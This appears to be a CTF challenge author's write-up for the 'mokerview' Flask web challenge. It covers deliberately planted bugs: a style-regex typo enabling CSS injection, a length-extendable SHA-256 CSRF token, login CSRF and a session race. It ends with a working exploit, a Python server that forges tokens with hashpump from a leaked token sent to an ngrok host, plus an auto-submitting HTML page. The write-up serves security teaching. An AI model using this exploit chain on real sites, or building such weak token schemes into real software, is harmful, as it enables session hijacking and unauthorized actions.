# mokerview (Web)
> Classic bug combo pack

This is a somewhat large Flask application where the intended solution is to chain a few kinda "classic" web bugs and claim a flagmoker for yourself. I'll go through the source and describe the bugs in each section, then at the end explain how you're intended to put them together.

The website lets you create and add mokers (images of Moker, a cat) to your account. There's a moker corresponding to the flag but only the admin is allowed to access it. The website also has its own CSRF protection and a CSP preventing any script and objects from being loaded on all pages.

## Code
```
FLAGMOKER = "lNvRX88" # The flag image on imgur
MOKERS = {"moker1": "dQJOyoO", "moker2": "dQJOyoO", "moker3": "dQJOyoO", "moker4": "dQJOyoO", "moker6": "dQJOyoO", "moker7": "dQJOyoO", "moker8": "dQJOyoO", "flagmoker": FLAGMOKER} # Default list of mokers (images on your profile)
MOKER_PATTERN = re.compile("^[A-Za-z0-9]+$") # regex corresponding to an imgur ID
MOKEROFTHEDAY = "moker3" # moker of the day used in /add?daily
STYLE_PATTERN = re.compile("^[A-Za-z0 -9./]+$") # regex trying to validate style paths
STYLES = ["moker.css", "plain.css"] # styles
```
This is a set of constants. The `STYLE_PATTERN` has a typo `0 -9` that allows you to use ASCII characters from ` ` to `9` including `"` and `'`.

```py
########### HELPERS

def imgur(moker):
    return f"https://i.imgur.com/{moker}.png"

ADMIN_PASS = "this_password_is_for_you_moker_!!!"
users = {"@admin": {"password": ADMIN_PASS, "mokers": []}}
sessions = defaultdict(dict)
@app.after_request
def csp(r):
    # Moker does not like "Java Script"
    r.headers["Content-Security-Policy"] = "script-src 'none'; object-src 'none'; img-src https://i.imgur.com/"
    return r
```
The session and user data is initialized here. A CSP is set for every request too.

```py
def session(f): # takes a request and adds the session info to the call 
    @wraps(f)
    def dec(*a, **k):
        session = request.cookies.get("session", None)
        if session is None or session not in sessions:
            return redirect("/")

        session_obj = sessions[session]
        return f(session_obj, *a, **k)
    return dec

def csrf(f): # takes a request and verifies a csrf token
    @wraps(f)
    def dec(*a, **k):
        session = request.cookies.get("session", None)
        if session is None or session not in sessions:
            return redirect("/")
        session = sessions[session]

        token = request.args.get("token", None)
        args = base64.urlsafe_b64decode(request.args.get("args", ""))
        if args != b"":
            query = request.path.encode() + b"?" + args
        else:
            query = request.path.encode()

        if token is None:
            return "CSRF token missing"
        # Note this verification is vulnerable to length extension.
        if hashlib.sha256(session["key"] + query).digest().hex() != token:
            return "Invalid CSRF token"

        request.args = url_decode(args)
        return f(*a, **k)
    return dec

def signer(session): # factory to return a function that signs URLs for the given session
    def sign(url): # make a CSRF token for this URL
        raw_url = url.encode()
        token = hashlib.sha256(session["key"] + raw_url).digest().hex()
        if url.find("?") != -1:
            # base, args = url.split("?") - original code would crash here if a url contained another ?, was crashing the server if a moker with ? was added
            idx = url.index("?")
            base = url[:idx]
            args = url[idx+1:]
            return base + "?" + url_encode({"args": base64.urlsafe_b64encode(args.encode()), "token": token})
        else:
            return url + "?" + url_encode({"args": '', "token": token})
    return sign

```
These helper functions mostly deal with the CSRF system. The CSRF system requires routes to have a `token` GET parameter which is signed like so: `sha256(session_key + url)`.

One may recognize this as being vulnerable to length extension. One can append to the url arbitrary data (`url + padding + anything`), given a valid CSRF token for original URL.

```py
def header(session):
    sign = signer(session)

    return f"<a href='{sign('/logout')}'>Logout</a> <a href='/view'>My Mokers</a> <a href='/add'>Add a Moker</a> <a href='/create'>Create a new Moker</a> <a href='/delete'>Remove Moker</a>\
<form id='add' method='POST' action='{sign('/add?daily=1')}'><input type='submit' value='*Add \"Moker of the Day\"*'/></form>"
```
This helper function returns the header line on the site.

```py
########### ROUTES

@app.route("/")
def home():
    session = request.cookies.get("session", None)
    if session is None or session not in sessions:
        return "<!DOCTYPE html><html><body>Welcome to my Moker Collection website. Please <a href=/register>register</a> or <a href=/login>login</a>.</body></html>"
    
    return redirect("/view")

@app.route('/static/<path:path>')
def staticServe(path):
    return send_from_directory('static', path)

@app.route("/register", methods=["GET"])
def register_form():
    return "<!DOCTYPE html><html><body>Register an Account<br>\
<form method='POST'><input type='text' name='user' value='username'><input type='text' name='password' value='password (stored in plaintext for you)'><input type='submit' value='Submit'></form></body></html>"

@app.route("/register", methods=["POST"])
def register():
    user = request.form.get("user", None)
    password = request.form.get("password", None)
    if user is None or password is None:
        return "Need user and password"
    if not (MOKER_PATTERN.match(user) and MOKER_PATTERN.match(password)):
        return "Invalid username/password"
    users[user] = {"password": password, "mokers": []}
    return redirect("/login")
```
These routes handle the homepage, static routing, and registering an account. Besides being (intentionally) stupid to use because the value attribute is set instead of a placeholder, they don't have any intended bugs.

```py
@app.route("/login", methods=["GET"])
def login_form():
    return "<!DOCTYPE html><html><body>Login<br>\
<form method='POST'><input type='text' name='user' value='Username'><input type='text' name='password' value='password (stored in plaintext for you)'><input type='submit' value='Submit'></form></body></html>"

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("user", "")
    password = request.form.get("password", "")
    if user not in users:
        return "No user"
    if users[user]["password"] == password:
        response = make_response(redirect("/view"))
        sid = request.cookies.get("session", secrets.token_hex(16))
        sessions[sid].clear()
        response.set_cookie("session", sid, httponly=True)
        sessions[sid]["user"] = user
        sessions[sid]["key"] = secrets.token_bytes(16)
        return response
    return "Invalid user/pass"
```
The login route creates a new session, re-using a session token if possible. This behaviour means that the contents of a session can actually change in another route _while_ it's being processed. In addition, the route doesn't have any CSRF protection, so you can use a cross domain form to log someone in.

```py
@app.route("/logout", methods=["GET"])
@csrf
def logout():
    sid = request.cookies.get("session") # already exists given by @csrf
    del sessions[sid]
    r = make_response(redirect("/"))
    r.delete_cookie("session")
    return r

@app.route("/view", methods=["GET"])
@session
def view(session):
    style = request.args.get("style", "/static/plain.css")
    if not STYLE_PATTERN.match(style):
        return "Bad style link"
    # attack with link `"//example.com/`

    mokers = "<br>".join(f"<img src={imgur(moker)} referrerpolicy=no-referrer class=moker></img>" for moker in users[session["user"]]["mokers"])
    styles = " ".join(f"<a href=/view?style=/static/{s}>{s}</a>" for s in STYLES)
    return f"<!DOCTYPE html><html><head><link rel=stylesheet href={style}></head><body>{header(session)}<br>Use Some Styles: {styles}<br>Your'e Mokers: <br><br>{mokers}</body></html>"
```
The logout route logs out a user and deletes their session.

The view route creates a view of all the mokers in a user's account. There is a vulnerability with the `STYLE_PATTERN` that not only allows you to include an external URL with `//attacker.com/attack.css`, but lets you clobber the DOM by starting with a `"`. This clobber will leak CSRF tokens for routes including `/add?daily=1`.

(There was a large oversight here - you can use the style injection here to just directly leak the img src values for flagmoker if it's on the admin's account and don't have do anything else! I should have implemented the clobering using a different tag.)

```py
@app.route("/create", methods=["GET"])
@session
def create_form(session):
    sign = signer(session)
    form = f"<form action='/create' method='POST'><input type='text' name='name' value='Name of Moker'><input type='text' name='path' value='imgur path without extension'><input type='submit' value='Create'></form>"

    return "<!DOCTYPE html><html><body>" + header(session) + "Create a moker.<br>" + form + "</body></html>"

@app.route("/create", methods=["POST"])
@session
def create(session):
    if len(MOKERS) > 30:
        return "We are at max moker capacity. Safety protocols do not allow adding more moker"

    name = request.form.get("name", None)
    if name is None or name in MOKERS:
        return "No name for new moker"
    path = request.form.get("path", None)
    if path is None or not MOKER_PATTERN.match(path):
        return "Invalid moker path"

    if requests.get(imgur(path)).status_code != 200:
        return "This moker does not appear to be valid"
    
    MOKERS[name] = path
    return redirect("/view")
```
These routes allow one to create a new moker. There's content injection here combined with /view because the name of the moker is not filtered at all, but not anything I figured you couldn't do with `/view`.

(This route was added after finishing the challenge for fun to let people add their own images for fun. This was a mistake because it opened up more unintended solutions that were limited by the length of MOKERS, meaning later solvers might be stuck with their solutions. I should have either removed the limit or not included the route.)

```

@app.route("/add", methods=["GET"])
@session
def add_form(session):
    sign = signer(session)
    mokers = " ".join(f"<form action='{sign('/add?moker=' + moker)}' method='POST'><input type='submit' value='{moker}'></form>" for moker in MOKERS)
    return "<!DOCTYPE html><html><body>" + header(session) + "Add a moker to your list.<br>" + mokers + "</body></html>"

@app.route("/add", methods=["POST"])
@csrf
@session
def add(session):
    moker = request.args.get("moker", None)
    if moker is None:
        if request.args.get('daily', False):
            moker = MOKEROFTHEDAY
    if (moker == "flagmoker" and session["user"] != "@admin") or moker not in MOKERS:
        return "Invalid moker"

    # Note this is a very expensive operation
    if requests.get(imgur(MOKERS[moker])).status_code != 200:
        return "This moker is not avaliable at this time"

    # session["user"] is reused, and could have changed!
    if(len(users[session["user"]]["mokers"]) > 30):
        # this is too many mokers for one person. you don't need this many
        users[session["user"]]["mokers"].clear()
    users[session["user"]]["mokers"].append(MOKERS[moker])
    return redirect("/view")
```
The add routes allow a user to add a moker to their collection. If the moker argument is not specified, then a daily moker can be added instead. The flagmoker is restricted to the admin only. The route then verifies the URL is actually alive and adds it to the user's, clearing it first if the user has more than 30.

The lookup on session["user"] can change due to /add, and the alive check on the image allows one to exploit the race condition to add a flagmoker to the non-admin account.

```py
@app.route("/delete", methods=["GET"])
@session
def delete_form(session):
    sign = signer(session)
    mokers = " ".join(f"<form action={sign('/delete?moker=' + moker)} method=POST><img src={imgur(moker)}></img><input type=submit value=Remove></form>" for moker in users[session["user"]]["mokers"])
    return "<!DOCTYPE html><html><body>" + header(session) + "Remove a moker from your list.<br>" + mokers + "</body></html>"

@app.route("/delete", methods=["POST"])
@csrf
@session
def delete(session):
    moker = request.args.get("moker", None)
    if moker is None:
        return "No moker to remove"
    users[session["user"]]["mokers"].remove(moker)
    return redirect("/view")

```
This form allows one to delete a moker from their page. It does not have any intentional vulnerabilities.

## Exploit
The intended solution uses this solve path:
- Create a user yourself first (just without the admin bot) to recieve the flagmoker.
- Clobber /view with " in the style path to leak a CSRF token. The leak will include a signed /add?daily=1 URL. This lets you have the admin add a daily moker to its account.
- Length extend the /add?daily=1 token with ?moker=flagmoker. This lets you have the admin add a flagmoker to its account.
- Race the /add?moker=flagmoker while logging into your own user. That will add the flagmoker to your user instead, and solve the challenge.

Here's my script:
```py
from flask import Flask, request, redirect, make_response, send_from_directory
import subprocess

app = Flask(__name__)

state = {"token": ""}

@app.errorhandler(404)
def handle404(e): # 404 is caused by token leak clobber
    u = request.url
    u = u.split("token=")[-1].split("%27")[0]
    if not u.isalnum():
        return "404"
    print("token", u)
    # use hashpump to grab the new token
    state["token"] = subprocess.check_output(["hashpump", "-k", "16", "-d", "/add?daily=1", "-a", "&moker=flagmoker", "-s", u]).decode().split("\n")[0]
    print("new", state["token"])
    return "OK"

@app.route("/token") # get the current forged token
def token():
    r = make_response(state["token"])
    r.headers["Access-Control-Allow-Origin"] = "*"
    return r

with open("sol.html") as f:
    SOL = f.read()

USER = "testingflagajsdafjha" # create the user first
# converts input into form //a.ngrok.io/
NGROK = input("base: ").split("https:")[1] + "/"
SOL = SOL.replace("{USER}",USER).replace("{NGROK}",NGROK)

@app.route("/index.html")
def index():
    return SOL

app.run(port=1337)
```
and the correspdonding sol.html:
```html
<!DOCTYPE html>
<html>
<body>
        <!-- view clobber -->
        <form id="f1" action="https://mokerview-web.chal.irisc.tf/view" target="_blank">
            <input type="hidden" name="style" value='"{NGROK}'></form>
        <!-- forged /add goes here -->
        <form id="f2" action="NONE" method="POST" target="_blank"></form>
        <!-- login to your user -->
        <form id="f3" action="https://mokerview-web.chal.irisc.tf/login" method="POST" target="_blank">
            <input type="hidden" name="user" value="{USER}"><input type="hidden" name="password" value="{USER}"></form>
<script>
let f1 = document.getElementById("f1");
f1.submit();
new Promise(r => setTimeout(r, 500)).then(_ => {
let base = "https://mokerview-web.chal.irisc.tf/add?args=ZGFpbHk9MYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4CZtb2tlcj1mbGFnbW9rZXI%3D&token=";
    fetch("https://{NGROK}token").then(d => d.text()).then(token => {
    let url = base + token;
    let f2 = document.getElementById("f2");
    f2.action = url;
    let f3 = document.getElementById("f3");
    f2.submit();
    f3.submit();
})
});
</script>
</body>
</html>
```

## Flag

![](https://i.imgur.com/lNvRX88.png)

THANK YOU "MARIE" FOR LETTING ME USE "MOKER'S" PHOTO IN THIS CHALLENGE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! THE CAT'S NAME IS ACTUALLY MOKA, MOKER IS A PET NAME


...

...

...


Also here's the original flag
![](https://cdn.discordapp.com/attachments/816337570647506984/1059020578100617236/image.png)
